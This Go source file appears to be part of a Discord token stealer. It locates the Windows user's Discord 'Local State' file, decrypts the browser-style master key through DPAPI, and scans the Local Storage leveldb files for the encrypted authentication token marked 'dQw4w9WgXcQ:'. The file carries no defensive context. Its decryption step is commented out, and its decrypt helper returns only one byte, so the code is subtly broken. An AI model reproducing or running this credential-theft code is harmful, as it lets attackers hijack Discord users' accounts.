package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/zavla/dpapi"
)

func GCMDecrypter(key []byte, nonce []byte, ciphertext []byte) byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}

	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}

	return plaintext[0]
}

func GetMasterKey() string {
	user, _ := user.Current()
	filepath := fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\Discord\\Local State", strings.Split(user.Username, "\\")[1])
	statecontents, _ := os.ReadFile(filepath)
	var decodedData map[string]interface{}
	json.Unmarshal([]byte(statecontents), &decodedData)
	master_key := decodedData["os_crypt"].(map[string]interface{})["encrypted_key"]
	intkey := []uint8(master_key.(string))
	realkey, _ := base64.StdEncoding.DecodeString(string(intkey))
	deobfkey := string(realkey)[5:]
	decrypted, err := dpapi.Decrypt([]byte(deobfkey))
	if err != nil {
		fmt.Println(err)
	}
	return string(decrypted)
}

func GetStorage() string {
	user, _ := user.Current()
	dirPath := fmt.Sprintf("C:\\Users\\%s\\AppData\\Roaming\\Discord\\Local Storage\\leveldb", strings.Split(user.Username, "\\")[1])
	regex := regexp.MustCompile(`dQw4w9WgXcQ:`)
	discordtoken := ""
	filepath.Walk(dirPath, func(path string, info os.FileInfo, _ error) error {
		if discordtoken != "" {
			return nil
		}
		if !info.Mode().IsRegular() {
			return nil
		}
		contents, _ := os.ReadFile(path)
		if !strings.HasSuffix(path, ".ldb") {
			return nil
		}
		if !strings.Contains(string(contents), "dQw4w9WgXcQ:") {
			return nil
		}
		start := strings.Index(string(contents), "dQw4w9WgXcQ:")
		end := strings.Index(string(contents)[start:], "\"") + 1
		token := string(contents)[start : start+end]
		if regex.MatchString(string(contents)) {
			discordtoken = strings.Split(token, ":")[1]
		}
		return nil
	})
	discordtoken = strings.Split(discordtoken, "\"")[0]
	return string(discordtoken)
}

func getToken() (string, string) {
	key := GetMasterKey()
	storage := GetStorage()
	//result := GCMDecrypter([]byte(key), []byte(storage[:12]), []byte(storage[12:]))
	//fmt.Println("Result: " + string(result))
	return key, storage
}
